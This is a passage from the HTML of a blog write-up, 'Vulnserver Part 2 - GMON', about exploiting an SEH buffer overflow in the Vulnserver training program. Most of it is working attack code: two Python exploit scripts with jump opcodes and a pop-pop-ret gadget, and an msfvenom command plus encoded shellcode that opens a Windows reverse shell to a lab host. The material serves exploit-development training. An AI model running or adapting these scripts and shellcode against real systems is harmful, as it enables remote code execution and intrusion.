+<span class="n">buf</span> <span class="o">+=</span> <span class="n">NOP</span> <span class="o">*</span> <span class="mi">11</span>
+
+<span class="c1"># Step 1 -- NSEH Overwrite -- short jump</span>
+<span class="c1"># jump back 16 bytes</span>
+<span class="c1"># nasm&gt;  jmp $-16</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xEB\xEE</span><span class="s2">"</span> <span class="o">+</span> <span class="n">NOP</span> <span class="o">+</span> <span class="n">NOP</span> 
+
+<span class="c1"># Step 0 -- SEH Overwrite -- jump to pop pop return</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">ppr_gadget</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Long Jump" src="/assets/img/vulnserver_gmon_61_long_jump.png"/></div></div></p>
+<p>We end up at the first A.</p>
+<h2 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link"> </a></h2>
+<p>Now that we have carved out enough space we can upload some shellcode. You can pop calc again like we did in TRUN, but I am skipping this step here and go straight for the reverse shell.</p>
+<p>Generate a reverse shell with msfvenom:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.2.79 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f py -v payload -e x86/shikata_ga_nai -b <span class="s1">'\x00\x0A'</span> <span class="nv">EXITFUNC</span><span class="o">=</span>seh
+</code></pre></div></div></div>
+<p>Please note that we use <code>EXITFUNC=seh</code> instead of <code>thread</code> this time.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - SEH based buffer overflow</span>
+<span class="c1"># Step 6 - Exploit</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">3549</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="c1"># new line 0x0a</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span> <span class="c1"># found badchars</span>
+<span class="n">NOP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span>
+
+<span class="c1"># msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.79 LPORT=53 -f py -v payload -e x86/shikata_ga_nai -b '\x00\x0A' EXITFUNC=seh</span>
+<span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xbd\xc6\xb8\x8f\xc1\xdb\xd2\xd9\x74\x24\xf4\x5a</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x29\xc9\xb1\x52\x31\x6a\x12\x03\x6a\x12\x83\x2c</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x44\x6d\x34\x4c\x5d\xf0\xb7\xac\x9e\x95\x3e\x49</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xaf\x95\x25\x1a\x80\x25\x2d\x4e\x2d\xcd\x63\x7a</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xa6\xa3\xab\x8d\x0f\x09\x8a\xa0\x90\x22\xee\xa3</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x12\x39\x23\x03\x2a\xf2\x36\x42\x6b\xef\xbb\x16</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x24\x7b\x69\x86\x41\x31\xb2\x2d\x19\xd7\xb2\xd2</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xea\xd6\x93\x45\x60\x81\x33\x64\xa5\xb9\x7d\x7e</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xaa\x84\x34\xf5\x18\x72\xc7\xdf\x50\x7b\x64\x1e</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x5d\x8e\x74\x67\x5a\x71\x03\x91\x98\x0c\x14\x66</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xe2\xca\x91\x7c\x44\x98\x02\x58\x74\x4d\xd4\x2b</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x7a\x3a\x92\x73\x9f\xbd\x77\x08\x9b\x36\x76\xde</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x2d\x0c\x5d\xfa\x76\xd6\xfc\x5b\xd3\xb9\x01\xbb</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xbc\x66\xa4\xb0\x51\x72\xd5\x9b\x3d\xb7\xd4\x23</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xbe\xdf\x6f\x50\x8c\x40\xc4\xfe\xbc\x09\xc2\xf9</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc3\x23\xb2\x95\x3d\xcc\xc3\xbc\xf9\x98\x93\xd6</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x28\xa1\x7f\x26\xd4\x74\x2f\x76\x7a\x27\x90\x26</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x3a\x97\x78\x2c\xb5\xc8\x99\x4f\x1f\x61\x33\xaa</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc8\x84\xc4\xb6\x47\xf1\xc6\xb6\x57\x34\x4e\x50</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x3d\x26\x06\xcb\xaa\xdf\x03\x87\x4b\x1f\x9e\xe2</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x4c\xab\x2d\x13\x02\x5c\x5b\x07\xf3\xac\x16\x75</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x52\xb2\x8c\x11\x38\x21\x4b\xe1\x37\x5a\xc4\xb6</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x10\xac\x1d\x52\x8d\x97\xb7\x40\x4c\x41\xff\xc0</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x8b\xb2\xfe\xc9\x5e\x8e\x24\xd9\xa6\x0f\x61\x8d</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x76\x46\x3f\x7b\x31\x30\xf1\xd5\xeb\xef\x5b\xb1</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x6a\xdc\x5b\xc7\x72\x09\x2a\x27\xc2\xe4\x6b\x58</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xeb\x60\x7c\x21\x11\x11\x83\xf8\x91\x2f\x75\x30</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x0c\xa7\x2c\xa1\x6d\xa5\xce\x1c\xb1\xd0\x4c\x94</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x4a\x27\x4c\xdd\x4f\x63\xca\x0e\x22\xfc\xbf\x30</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x91\xfd\x95</span><span class="s2">"</span>
+
+<span class="n">ppr_address</span> <span class="o">=</span> <span class="mh">0x625010b4</span>
+<span class="n">ppr_gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">ppr_address</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"GMON /."</span>
+
+<span class="c1"># step 3</span>
+<span class="c1"># execute payload</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">NOP</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">payload</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">16</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="c1"># filler</span>
+
+<span class="c1"># Step 2 -- long jump</span>
+<span class="c1"># jump back 3533 bytes to the start of the AAAA</span>
+<span class="c1"># nasm&gt;  jmp -3533</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xE9\x2E\xF2\xFF\xFF</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">NOP</span> <span class="o">*</span> <span class="mi">11</span>
+
+<span class="c1"># Step 1 -- NSEH Overwrite -- short jump</span>
+<span class="c1"># jump back 16 bytes</span>
+<span class="c1"># nasm&gt;  jmp $-16</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xEB\xEE</span><span class="s2">"</span> <span class="o">+</span> <span class="n">NOP</span> <span class="o">+</span> <span class="n">NOP</span>
+
+<span class="c1"># Step 0 -- SEH Overwrite -- jump to pop pop return</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">ppr_gadget</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># filler</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># shift + f9</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>After passing the exception we receive a reverse shell:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Reverse Shell" src="/assets/img/vulnserver_gmon_70_revshell.png"/></div></div></p>
+                    <div class="article-meta">
+                        <section class="article-share-section">
+                            <a href="https://twitter.com/intent/tweet?text=Vulnserver%20Part%202%20-%20GMON%20https%3A%2F%2Fsecoats.github.io%2Fposts%2Fvulnserver_2_gmon.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+                            <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsecoats.github.io%2Fposts%2Fvulnserver_2_gmon.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+                            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fsecoats.github.io%2Fposts%2Fvulnserver_2_gmon.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+                          </section>
+                        <section class="article-meta-section">
+                            <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+                            <span itemprop="keywords">
+                                <a href="/tags.html#vulnserver" class="article-tag" rel="tag">vulnserver</a><span class="sep"> </span>
+                                <a href="/tags.html#windows" class="article-tag" rel="tag">windows</a><span class="sep"> </span>
+                                <a href="/tags.html#bufferoverflow" class="article-tag" rel="tag">bufferoverflow</a><span class="sep"> </span>
+                                <a href="/tags.html#binary" class="article-tag" rel="tag">binary</a><span class="sep"> </span>
+                                <a href="/tags.html#exploit" class="article-tag" rel="tag">exploit</a><span class="sep"> </span>
+                                <a href="/tags.html#bof" class="article-tag" rel="tag">bof</a><span class="sep"> </span>
+                            </span>
+                        </section>
+                        <section class="article-meta-section">
+                            <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+                            <span itemprop="keywords">
+                                <a href="/categories.html#writeup" class="article-tag" rel="tag">writeup</a>
+                            </span>
+                        </section>
+                        <section class="article-meta-section">
+                            <span style="margin-right:1em;"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Published:</strong> <time datetime="2021-09-14 12:01:00-04:00">September 14, 2021</time></span>
+                    
+                        </section> 
+                        <section class="article-meta-section">
+                            
+                            <span><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Last Updated:</strong> <time datetime="2021-09-14 12:01:00-04:00">September 14, 2021</time></span>
+                        </section>
+                    </div>
+                </article>
+            </main>
+            <div id="footerbar">
+                <footer class="wrapper">
+                    <div class="footer-info">
+                        <ul class="social-icons">
+    <li><a href="https://github.com/secoats" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    <!--<li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>-->
+    <li><a href="https://twitter.com/cybercereals" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> Twitter</a></li>
+</ul>
+<div class="copyright-notice">© 2021 secoats</div>
+                    </div>
+                </footer>
+            </div>
+        </div>
+        <script src="/assets/js/main.js"></script>
+    </body>
+</html>
